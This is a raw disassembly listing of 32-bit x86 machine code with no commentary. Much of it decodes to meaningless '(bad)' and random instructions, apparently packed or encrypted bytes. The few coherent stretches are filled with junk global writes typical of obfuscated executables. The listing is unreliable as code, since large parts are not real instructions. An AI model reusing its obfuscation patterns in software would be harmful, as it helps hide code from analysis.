  40db27:	xchg   esp,eax
  40db28:	inc    ebx
  40db29:	push   ebp
  40db2a:	inc    esi
  40db2b:	lock mov esp,0x6c42cd0d
  40db31:	adc    DWORD PTR [ebx-0x2e],0x958e23aa
  40db38:	popf   
  40db39:	outs   dx,DWORD PTR ds:[esi]
  40db3a:	mov    DWORD PTR ds:0x88eb487e,ecx
  40db40:	xor    bh,BYTE PTR [ebx]
  40db42:	sub    cl,ch
  40db44:	dec    esp
  40db45:	mov    ds:0x6fa09e6d,al
  40db4a:	jecxz  0x40db5f
  40db4c:	out    dx,eax
  40db4d:	inc    ebp
  40db4e:	fisub  WORD PTR [edi-0x44241378]
  40db54:	aas    
  40db55:	daa    
  40db56:	push   ecx
  40db57:	(bad)  
  40db58:	gs mov bh,0xb1
  40db5b:	iret   
  40db5c:	sbb    ecx,DWORD PTR [edi-0x59d537e6]
  40db62:	mov    DWORD PTR ds:0x754f18da,0x761cace2
  40db6c:	jge    0x40db3e
  40db6e:	ins    DWORD PTR es:[edi],dx
  40db6f:	pop    ecx
  40db70:	mov    esi,0xa5eb3d0d
  40db75:	or     al,0x5a
  40db77:	nop
  40db78:	push   esi
  40db79:	retf   0x9
  40db7c:	jmp    0x40db3b
  40db7e:	mov    esi,0xe80875ee
  40db83:	(bad)  
  40db84:	loop   0x40db30
  40db86:	jbe    0x40db4c
  40db88:	and    esp,DWORD PTR [ecx+0x67]
  40db8b:	and    eax,0xcdf11be1
  40db90:	(bad)  
  40db91:	ficomp DWORD PTR [edi+0x56]
  40db94:	mov    al,ds:0xe9b2d107
  40db99:	dec    esp
  40db9a:	mov    ebp,0x62108843
  40db9f:	pop    ss
  40dba0:	or     esi,DWORD PTR [esi+0x34]
  40dba3:	int    0x2a
  40dba5:	mov    ebx,0x5a7b6e73
  40dbaa:	or     bh,BYTE PTR [esi+0x51]
  40dbad:	test   al,0xea
  40dbaf:	xchg   esi,eax
  40dbb0:	xor    DWORD PTR [esi+eiz*1-0x3ec4f061],ebx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x7ebfeba4],0xfa4a8c75
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc32
  40dbe0:	xchg   BYTE PTR [edx+edx*1+0x74d6ad50],cl
  40dbe7:	pop    ss
  40dbe8:	pusha  
  40dbe9:	jne    0x40dbe6
  40dbeb:	pop    ebx
  40dbec:	xor    al,0xff
  40dbee:	ror    DWORD PTR [esi-0x60],0x90
  40dbf2:	add    DWORD PTR [edx+edi*4-0x60],edx
  40dbf6:	les    eax,FWORD PTR [si-0x3c]
  40dbfa:	dec    edx
  40dbfb:	push   0x2a
  40dbfd:	xchg   DWORD PTR [esi+ebx*2-0x1ea3f592],ebp
  40dc04:	retf   
  40dc05:	sbb    eax,0x601c3574
  40dc0a:	outs   dx,DWORD PTR ds:[esi]
  40dc0b:	sbb    BYTE PTR [esi+edi*4],dh
  40dc0e:	sbb    esp,DWORD PTR [ecx]
  40dc10:	inc    ebp
  40dc11:	fist   WORD PTR ds:0x49304487
  40dc17:	jae    0x40dc03
  40dc19:	push   ecx
  40dc1a:	nop
  40dc1b:	push   ebp
  40dc1c:	and    ch,bl
  40dc1e:	and    BYTE PTR [esi-0x267fb216],dh
  40dc24:	bound  esi,QWORD PTR [eax]
  40dc26:	jle    0x40dc08
  40dc28:	iret   
  40dc29:	sub    eax,0xf79a4f9d
  40dc2e:	xor    esp,edx
  40dc30:	repnz cmp eax,0x9b2624de
  40dc36:	and    al,dh
  40dc38:	xchg   edi,eax
  40dc39:	jno    0x40dbdb
  40dc3b:	pop    esi
  40dc3c:	and    al,0x21
  40dc3e:	xor    DWORD PTR [ecx+0x1c],edx
  40dc41:	jne    0x40dca9
  40dc43:	sub    ch,bl
  40dc45:	sub    eax,DWORD PTR [ebp-0x207b19e5]
  40dc4b:	jle    0x40dcae
  40dc4d:	inc    edx
  40dc4e:	jns    0x40dbde
  40dc50:	mov    ch,0x13
  40dc52:	inc    ebx
  40dc53:	(bad)  
  40dc54:	mov    ebp,0x8e47f971
  40dc59:	enter  0xf971,0xa6
  40dc5d:	out    0xef,eax
  40dc5f:	cmc    
  40dc60:	fadd   QWORD PTR [ebx+0x20]
  40dc63:	dec    edx
  40dc64:	popa   
  40dc65:	sub    bh,ah
  40dc67:	push   esp
  40dc68:	xchg   ebx,eax
  40dc69:	mov    edi,esi
  40dc6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc6c:	jns    0x40dc7c
  40dc6e:	pusha  
  40dc6f:	(bad)  
  40dc70:	inc    eax
  40dc71:	add    dl,cl
  40dc73:	in     eax,dx
  40dc74:	push   edi
  40dc75:	adc    eax,0x3446a6cf
  40dc7a:	dec    edx
  40dc7b:	dec    edi
  40dc7c:	xchg   ecx,eax
  40dc7d:	xor    bl,BYTE PTR [eax+0x43ff007e]
  40dc83:	pop    ss
  40dc84:	adc    BYTE PTR [ebx+0x14],cl
  40dc87:	inc    ebp
  40dc88:	add    ebx,DWORD PTR [ebx+ebp*4]
  40dc8b:	or     ah,dl
  40dc8d:	push   ebp
  40dc8e:	sbb    bl,bh
  40dc90:	enter  0x7ee0,0xc1
  40dc94:	jbe    0x40dd0f
  40dc96:	mov    ds:0x29bef9a0,eax
  40dc9b:	sbb    al,0xc4
  40dc9d:	xchg   ebx,eax
  40dc9e:	addr16 mov cl,0x99
  40dca1:	cli    
  40dca2:	inc    esp
  40dca3:	jl     0x40dcd2
  40dca5:	jmp    0xe3eb:0x5c9affab
  40dcac:	or     bl,dh
  40dcae:	inc    esi
  40dcaf:	cmp    ecx,edi
  40dcb1:	loopne 0x40dc7a
  40dcb3:	shl    BYTE PTR ds:[eax+0x503e2ddf],1
  40dcba:	jecxz  0x40dc4f
  40dcbc:	mov    al,0xe0
  40dcbe:	cmp    dl,BYTE PTR [ebx+eax*8+0x49]
  40dcc2:	add    BYTE PTR [edi*2-0x791ae096],dh
  40dcc9:	mov    ebp,0x17ba4ad6
  40dcce:	and    ah,cl
  40dcd0:	int    0x77
  40dcd2:	stos   DWORD PTR es:[edi],eax
  40dcd3:	aad    0x82
  40dcd5:	ficom  DWORD PTR [edi]
  40dcd7:	scas   al,BYTE PTR es:[edi]
  40dcd8:	cmp    al,BYTE PTR [ecx-0x5700e11b]
  40dcde:	bound  edi,QWORD PTR [ebp+eiz*1+0x71fbc1d5]
  40dce5:	data16 adc BYTE PTR [ebx+0x4897cb66],dh
  40dcec:	inc    ecx
  40dced:	adc    BYTE PTR [eax],dh
  40dcef:	adc    al,0x92
  40dcf1:	sbb    esp,DWORD PTR [ecx+0x4a26f546]
  40dcf7:	loopne 0x40dd64
  40dcf9:	sub    eax,esi
  40dcfb:	jb     0x40dd60
  40dcfd:	lods   eax,DWORD PTR ds:[esi]
  40dcfe:	test   al,0x58
  40dd00:	sub    al,0xb8
  40dd02:	sub    ecx,ebx
  40dd04:	mov    DWORD PTR [eax],0xd4c7d150
  40dd0a:	(bad)  
  40dd0b:	xchg   edi,eax
  40dd0c:	adc    dh,dh
  40dd0e:	pop    ebp
  40dd0f:	and    ebx,DWORD PTR [eax+0x42]
  40dd12:	and    eax,0x7df6a925
  40dd17:	jmp    0xf323:0xfac935b0
  40dd1e:	mov    eax,ds:0x523be51
  40dd23:	js     0x40dcd6
  40dd25:	in     al,dx
  40dd26:	std    
  40dd27:	ret    0x7d46
  40dd2a:	jg     0x40dd8f
  40dd2c:	loope  0x40dd7c
  40dd2e:	inc    ebx
  40dd2f:	mov    edi,0xa62cae3d
  40dd34:	add    al,0xf1
  40dd36:	mov    esi,DWORD PTR es:[edx+0x4e]
  40dd3a:	pop    edx
  40dd3b:	jb     0x40dd9e
  40dd3d:	lods   eax,DWORD PTR ds:[esi]
  40dd3e:	mov    cl,0x70
  40dd40:	jecxz  0x40dda3
  40dd42:	inc    ebp
  40dd43:	adc    DWORD PTR [edi+0x62],ebx
  40dd46:	mov    ebp,0x89cd9dca
  40dd4b:	je     0x40dd7f
  40dd4d:	xchg   al,al
  40dd4f:	and    BYTE PTR [si],ah
  40dd52:	scas   eax,DWORD PTR es:[edi]
  40dd53:	mov    esp,DWORD PTR [ecx]
  40dd55:	jl     0x40dd26
  40dd57:	hlt    
  40dd58:	mov    BYTE PTR [edx*8-0x2d597ffa],ch
  40dd5f:	xchg   esp,eax
  40dd60:	mov    ecx,0xc793490e
  40dd65:	pop    edi
  40dd66:	add    eax,0x4a78e3ca
  40dd6b:	popa   
  40dd6c:	mov    edi,0xe8ae88ac
  40dd71:	push   es
  40dd72:	pop    ebp
  40dd73:	pop    ebp
  40dd74:	ret    
  40dd75:	add    al,0xd6
  40dd77:	or     bh,BYTE PTR [ebp+0x37cd480c]
  40dd7d:	add    eax,0x28288223
  40dd82:	sbb    ah,BYTE PTR [edi]
  40dd84:	fsubr  st,st(1)
  40dd86:	cmp    DWORD PTR [edi+0x63fcab04],ebp
  40dd8c:	adc    DWORD PTR [eax-0x39],edx
  40dd8f:	leave  
  40dd90:	cmp    dl,ah
  40dd92:	test   BYTE PTR [ebx-0x89c697a],ch
  40dd98:	loope  0x40dd23
  40dd9a:	push   ecx
  40dd9b:	adc    edx,edx
  40dd9d:	test   al,0xdb
  40dd9f:	pop    edx
  40dda0:	mov    al,ds:0xea982c62
  40dda5:	lock lock repz pop edx
  40dda9:	pop    edi
  40ddaa:	mov    eax,ds:0x189b6337
  40ddaf:	cs clc 
  40ddb1:	sbb    BYTE PTR [edi+ebp*4+0x2c],dl
  40ddb5:	sub    DWORD PTR [eax],0xffffff87
  40ddb8:	push   esi
  40ddb9:	loop   0x40dd87
  40ddbb:	das    
  40ddbc:	lock or BYTE PTR [ecx-0x34],ah
  40ddc0:	fadd   DWORD PTR [eax-0x7f]
  40ddc3:	std    
  40ddc4:	mov    bh,0x15
  40ddc6:	sub    DWORD PTR [ebp-0x5a],ebp
  40ddc9:	sbb    al,0xdb
  40ddcb:	mov    ds:0x8c85c6a1,al
  40ddd0:	dec    edi
  40ddd1:	mov    ebp,0x538c8a18
  40ddd6:	pop    ebx
  40ddd7:	xor    al,0x15
  40ddd9:	sbb    cl,BYTE PTR [ebx+0x3f635da1]
  40dddf:	jo     0x40ddcc
  40dde1:	inc    esi
  40dde2:	fst    QWORD PTR [esi]
  40dde4:	xchg   ecx,eax
  40dde5:	mov    dh,0x52
  40dde7:	sbb    BYTE PTR [edi+ebx*8-0x4b84dd38],bh
  40ddee:	icebp  
  40ddef:	mov    ebx,0xc424340a
  40ddf4:	xchg   al,ah
  40ddf6:	sbb    eax,0x95369d2b
  40ddfb:	repnz fldenv [edi+0x1fa2b9cb]
  40de02:	pop    ecx
  40de03:	xor    BYTE PTR [esi+0x5640ebca],dh
  40de09:	mov    cl,0x1d
  40de0b:	das    
  40de0c:	pop    esi
  40de0d:	push   eax
  40de0e:	bound  eax,QWORD PTR [eax-0x6d]
  40de11:	push   esi
  40de12:	or     ebp,ebp
  40de14:	xor    ecx,DWORD PTR fs:[ebp-0x72f775cf]
  40de1b:	xor    bh,BYTE PTR [ebx]
  40de1d:	inc    esi
  40de1e:	iret   
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43381f,0x0
  40de5a:	mov    eax,ds:0x43381f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43381f,eax
  40de65:	cmp    DWORD PTR ds:0x43381f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43381f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43386f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	div    DWORD PTR [eax-0x45047bdf]
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40deee
  40deb3:	(bad)  
  40deb4:	ds dec edi
  40deb6:	cmc    
  40deb7:	pop    ebp
  40deb8:	push   eax
  40deb9:	loop   0x40de7c
  40debb:	mov    edx,cs
  40debd:	dec    esi
  40debe:	sbb    eax,0x438fa5be
  40dec3:	push   es
  40dec4:	xor    WORD PTR [ebx+ecx*8],sp
  40dec8:	test   al,0x1a
  40deca:	sub    edx,DWORD PTR [edx+edx*8+0x7cb28545]
  40ded1:	fld    TBYTE PTR [esi+0x3a]
  40ded4:	jmp    0x345b:0x4c1ac62e
  40dedb:	loope  0x40df19
  40dedd:	js     0x40df2d
  40dedf:	call   0x6af268e1
  40dee4:	pop    edi
  40dee5:	cmp    al,0x71
  40dee7:	lds    edi,FWORD PTR [edi-0x29]
  40deea:	adc    DWORD PTR [edi+0x625557fb],edx
  40def0:	push   cs
  40def1:	lea    esp,[ebx]
  40def3:	pushf  
  40def4:	out    0xd1,eax
  40def6:	test   DWORD PTR [ebx+edi*2],0x37134702
  40defd:	push   ds
  40defe:	mov    ebx,0xd8a6c0b2
  40df03:	lods   al,BYTE PTR ds:[esi]
  40df04:	sub    al,0x8
  40df06:	ret    
  40df07:	xchg   BYTE PTR [edx+0x23f447f0],ch
  40df0d:	inc    ebx
  40df0e:	push   eax
  40df0f:	call   0xf263:0xffae4593
  40df16:	mov    ebp,0x4b0a6faf
  40df1b:	sbb    edx,0xa20439aa
  40df21:	pop    edx
  40df23:	ret    0x9018
  40df26:	jns    0x40df59
  40df28:	into   
  40df29:	ins    BYTE PTR es:[edi],dx
  40df2a:	lods   eax,DWORD PTR ds:[esi]
  40df2b:	test   eax,0x8212aea7
  40df30:	dec    ecx
  40df31:	fistp  DWORD PTR [edx-0x1578f0c]
  40df37:	cmp    eax,0xbe673b29
  40df3c:	ins    DWORD PTR es:[edi],dx
  40df3d:	lea    edi,[ebx]
  40df3f:	dec    edx
  40df40:	mov    ebp,0x3592ecd4
  40df45:	sub    DWORD PTR ds:0x3dbd6a9e,esi
  40df4b:	loope  0x40df09
  40df4d:	mov    cl,0x73
  40df4f:	sub    eax,0xe0e86292
  40df54:	mov    esp,DWORD PTR [ebp-0x2faf94c2]
  40df5a:	or     ebx,DWORD PTR [edi-0x73]
  40df5d:	cmp    eax,0xffffffc8
  40df60:	bnd jle 0x40df70
  40df63:	push   ebx
  40df64:	and    ebp,ebp
  40df66:	ins    BYTE PTR es:[edi],dx
  40df67:	and    cl,dh
  40df69:	jbe    0x40df84
  40df6b:	adc    al,0x82
  40df6d:	pushf  
  40df6e:	dec    esp
  40df6f:	add    ebx,esp
  40df71:	and    BYTE PTR [edx*1+0x4bb3009f],bl
  40df78:	cmp    eax,0x4b728f0f
  40df7d:	jge    0x40df51
  40df7f:	stos   BYTE PTR es:[edi],al
  40df80:	adc    ebx,DWORD PTR [esi-0x7c]
  40df83:	adc    ebp,ecx
  40df85:	scas   al,BYTE PTR es:[edi]
  40df86:	ror    DWORD PTR ds:0xf0696360,0xcf
  40df8d:	xchg   ecx,eax
  40df8e:	pushf  
  40df8f:	jle    0x40df94
  40df91:	xchg   ebx,eax
  40df92:	pop    esp
  40df93:	aas    
  40df94:	int    0x80
  40df96:	mov    bl,0xe8
  40df98:	fidivr WORD PTR [edx]
  40df9a:	xchg   ebp,eax
  40df9b:	xlat   BYTE PTR ds:[ebx]
  40df9c:	not    cl
  40df9e:	test   eax,0x4a38c802
  40dfa3:	stos   BYTE PTR es:[edi],al
  40dfa4:	inc    esi
  40dfa5:	mov    al,ds:0x6fa0d882
  40dfaa:	aam    0xf7
  40dfac:	inc    edi
  40dfad:	jbe    0x40e00a
  40dfaf:	push   ebp
  40dfb0:	clc    
  40dfb1:	xor    al,ah
  40dfb3:	loopne 0x40dfaa
  40dfb5:	xor    eax,0xd48959f2
  40dfba:	pop    es
  40dfbb:	pusha  
  40dfbc:	add    BYTE PTR [esi+0x22],0x9e
  40dfc0:	fldcw  WORD PTR [edi+edi*8]
  40dfc3:	push   edi
  40dfc4:	pop    ebx
  40dfc5:	imul   ebx,DWORD PTR [ebp+0x5035d8d5],0x8b8e4d62
  40dfcf:	inc    ebp
  40dfd0:	or     BYTE PTR [ecx+0x4338172d],al
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x43386b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	xor    al,BYTE PTR [edi-0x46]
  40e006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e06f
  40e010:	jmp    0x40e03f
  40e012:	fs enter 0xbdf3,0xb6
  40e017:	push   esi
  40e018:	(bad)  
  40e019:	(bad)  
  40e01a:	mov    ds:0x69a3b9fb,eax
  40e01f:	jno    0x40e037
  40e021:	lods   eax,DWORD PTR ds:[esi]
  40e022:	sti    
  40e023:	add    BYTE PTR [esi-0x74],bh
  40e026:	adc    al,0x14
  40e028:	mov    al,ds:0x339ba77
  40e02d:	loope  0x40dfb3
  40e02f:	cmp    dh,0xd5
  40e032:	jnp    0x40dfd6
  40e034:	or     BYTE PTR [edi-0x26df59a5],0x5b
  40e03b:	mov    ds:0x88aefbb0,al
  40e040:	xchg   ecx,eax
  40e041:	xor    eax,0x32ab1475
  40e046:	lods   al,BYTE PTR ds:[esi]
  40e047:	xlat   BYTE PTR ds:[ebx]
  40e048:	pop    edi
  40e049:	stos   BYTE PTR es:[edi],al
  40e04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e04b:	and    ch,BYTE PTR [ecx]
  40e04d:	rcl    bl,cl
  40e04f:	and    BYTE PTR [edx+eiz*8-0x2c],al
  40e053:	adc    BYTE PTR [esi],cl
  40e055:	in     al,dx
  40e056:	sub    bl,BYTE PTR es:[edx-0x35]
  40e05a:	retf   0x6964
  40e05d:	jmp    0x73c98631
  40e062:	xchg   ebp,eax
  40e063:	adc    ebx,esi
  40e065:	leave  
  40e066:	ror    bh,1
  40e068:	mov    eax,0x5947081f
  40e06d:	push   cs
  40e06e:	aaa    
  40e06f:	stos   BYTE PTR es:[edi],al
  40e070:	or     BYTE PTR [esi+0x12],cl
  40e073:	cwde   
  40e074:	in     al,0xfa
  40e076:	sub    BYTE PTR [esi],bh
  40e078:	aam    0x4
  40e07a:	cwde   
  40e07b:	jae    0x40e02c
  40e07d:	pop    edx
  40e07e:	lahf   
  40e07f:	dec    edi
  40e080:	pop    ebx
  40e081:	pop    edi
  40e082:	push   ecx
  40e083:	adc    BYTE PTR [ebx],dl
  40e085:	adc    DWORD PTR [edx-0x69],esi
  40e088:	or     ch,BYTE PTR [ebp+0x6153a71e]
  40e08e:	dec    ebx
  40e08f:	pop    eax
  40e090:	push   ss
  40e091:	iret   
  40e092:	xchg   edx,eax
  40e093:	or     eax,0x487a31ef
  40e098:	inc    ebx
  40e099:	mov    dl,0x32
  40e09b:	nop
  40e09c:	mov    cl,0x25
  40e09e:	jmp    0x2e3a:0x8ea3f144
  40e0a5:	xor    eax,DWORD PTR [ebp+ecx*2+0x584e3193]
  40e0ac:	lock push 0xb9a0ce5d
  40e0b2:	dec    esp
  40e0b3:	inc    BYTE PTR [ecx-0x3b]
  40e0b6:	adc    edi,ebp
  40e0b8:	push   esi
  40e0b9:	fwait
  40e0ba:	add    ecx,eax
  40e0bc:	in     eax,0xa1
  40e0be:	dec    eax
  40e0bf:	jb     0x40e056
  40e0c1:	adc    eax,0x1bf96b50
  40e0c6:	cdq    
  40e0c7:	xchg   DWORD PTR [ebp-0x615f05f1],ebx
  40e0cd:	or     esi,DWORD PTR [ebx+0x5af53a08]
  40e0d3:	mov    fs,WORD PTR [edi-0x2a5180d]
  40e0d9:	xchg   DWORD PTR [ecx-0x36],ebx
  40e0dc:	mov    esp,0xf1e2bd57
  40e0e1:	add    esp,DWORD PTR [eax]
  40e0e3:	stc    
  40e0e4:	(bad)  [ecx-0x209c49a4]
  40e0ea:	jns    0x40e0a5
  40e0ec:	add    eax,0x428d6805
  40e0f1:	je     0x40e0eb
  40e0f3:	or     BYTE PTR [edx],bh
  40e0f5:	cmp    eax,0xb91b5540
  40e0fa:	(bad)  
  40e0fb:	stc    
  40e0fc:	fld    DWORD PTR [ecx]
  40e0fe:	stos   DWORD PTR es:[edi],eax
  40e0ff:	cmp    esp,DWORD PTR [edx]
  40e101:	mov    ebx,0x6ff40dd
  40e106:	mov    esi,0x9aea4ec3
  40e10b:	das    
  40e10c:	xor    DWORD PTR [ecx+edi*4-0x50438d3],edi
  40e113:	jg     0x40e130
  40e115:	cli    
  40e116:	jne    0x40e0c7
  40e118:	mov    ah,0x6d
  40e11a:	and    dh,bh
  40e11c:	nop
  40e11d:	jo     0x40e17b
  40e11f:	jne    0x40e0ef
  40e121:	call   0xd698880e
  40e126:	adc    bh,BYTE PTR [ecx-0x1a]
  40e129:	xchg   esp,eax
  40e12a:	push   0x33
  40e12c:	mov    BYTE PTR [ecx+0x43382315],0x0
  40e133:	xchg   edi,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x43386f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	push   ebx
  40e15b:	pop    es
  40e15c:	xchg   esp,eax
  40e15d:	sbb    DWORD PTR [edx-0x66],esi
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e12c
  40e167:	sar    BYTE PTR [ebp+0x27f9654d],0x66
  40e16e:	iret   
  40e16f:	out    dx,al
  40e170:	pop    edx
  40e171:	ins    DWORD PTR es:[edi],dx
  40e172:	mov    dh,0xdc
  40e174:	aad    0x1c
  40e176:	pop    edi
  40e177:	pop    es
  40e178:	test   eax,0x7e28eefe
  40e17d:	mov    ecx,0xde08f4c0
  40e182:	cmp    bl,BYTE PTR [edx-0x3a]
  40e185:	fcmovne st,st(0)
  40e187:	xor    esp,DWORD PTR [ecx-0x8]
  40e18a:	mov    al,ds:0x570ceaaa
  40e18f:	or     al,0x4c
  40e191:	mov    ebx,0xd76a733c
  40e196:	push   edi
  40e197:	adc    cl,BYTE PTR [esi+0x743c8361]
  40e19d:	sub    bh,bh
  40e19f:	adc    BYTE PTR [ebx],dl
  40e1a1:	xor    al,0x88
  40e1a3:	pop    ebx
  40e1a4:	test   esp,esp
  40e1a6:	sub    al,0x84
  40e1a8:	mov    ds:0x8b5cbd41,al
  40e1ad:	cwde   
  40e1ae:	xor    ch,al
  40e1b0:	or     dh,BYTE PTR [esi+0x46]
  40e1b3:	les    edi,FWORD PTR [esi-0x11]
  40e1b6:	cmp    eax,0x9f251f9d
  40e1bb:	lock adc eax,0xe28fc4f3
  40e1c1:	loopne 0x40e1bc
  40e1c3:	inc    ebp
  40e1c4:	or     BYTE PTR [eax+0x10],bl
  40e1c7:	jl     0x40e1fc
  40e1c9:	inc    esp
  40e1ca:	shl    DWORD PTR [ecx+0x34c6d9a4],1
  40e1d0:	fdivr  QWORD PTR [edi+ebp*4-0x1c9b29be]
  40e1d7:	inc    edx
  40e1d8:	es jmp 0x40e1a7
  40e1db:	xchg   ebx,eax
  40e1dc:	in     al,0xf
  40e1de:	push   esi
  40e1df:	inc    ebx
  40e1e0:	hlt    
  40e1e1:	retf   0x9b36
  40e1e4:	xchg   bl,dl
  40e1e6:	addr16 add ebp,edi
  40e1e9:	mov    ebx,0xb2e7c410
  40e1ee:	rcr    BYTE PTR [ecx+0x6b],1
  40e1f1:	test   DWORD PTR [ecx],ecx
  40e1f3:	mov    ebp,0x2d70871f
  40e1f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1f9:	jno    0x40e22f
  40e1fb:	sti    
  40e1fc:	mov    dh,0x36
  40e1fe:	nop
  40e1ff:	add    esi,DWORD PTR [ecx-0x2f092c6d]
  40e205:	mov    esi,0xeebbc04f
  40e20a:	pop    ds
  40e20b:	cmp    al,0x34
  40e20d:	loope  0x40e1e0
  40e20f:	inc    BYTE PTR [ecx-0x63440cb9]
  40e215:	jp     0x40e200
  40e217:	repnz lahf 
  40e219:	or     al,0xe9
  40e21b:	or     BYTE PTR [eax],bh
  40e21d:	pop    edi
  40e21e:	sti    
  40e21f:	sub    DWORD PTR [eax-0x1c],ebx
  40e222:	je     0x40e211
  40e224:	scas   eax,DWORD PTR es:[edi]
  40e225:	jmp    0xb8ad8f9
  40e22a:	in     al,dx
  40e22b:	int3   
  40e22c:	sbb    ch,BYTE PTR [edx+edi*8-0x40b7c2c1]
  40e233:	in     eax,0x2e
  40e235:	add    esp,0x75
  40e238:	ds jne 0x40e236
  40e23b:	adc    esi,DWORD PTR [edi+0x1a]
  40e23e:	push   edi
  40e23f:	div    BYTE PTR fs:[edi]
  40e242:	mov    ah,0xab
  40e244:	enter  0xa85d,0x47
  40e248:	xchg   BYTE PTR [esi+0x46],bh
  40e24b:	cmc    
  40e24c:	rol    BYTE PTR [ebx+0x54],cl
  40e24f:	cmc    
  40e250:	jl     0x40e25c
  40e252:	in     eax,dx
  40e253:	push   ss
  40e254:	cs add al,0x76
  40e257:	adc    esp,edi
  40e259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e25a:	fs (bad) 
  40e25c:	call   0xd149019c
  40e261:	xor    al,0x6b
  40e263:	popf   
  40e264:	add    al,0x38
  40e266:	pop    es
  40e267:	inc    esp
  40e268:	(bad)  
  40e269:	sbb    eax,0x72daa25a
  40e26e:	outs   dx,BYTE PTR ds:[esi]
  40e26f:	mov    edi,0xdbb70345
  40e274:	daa    
  40e275:	sar    DWORD PTR [eax+0x27],cl
  40e278:	dec    edx
  40e279:	out    0x9d,eax
  40e27b:	sub    ecx,DWORD PTR [eax+0x29]
  40e27e:	mov    eax,0x898b191d
  40e283:	inc    ebp
  40e284:	call   0xff496014
  40e289:	add    eax,0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
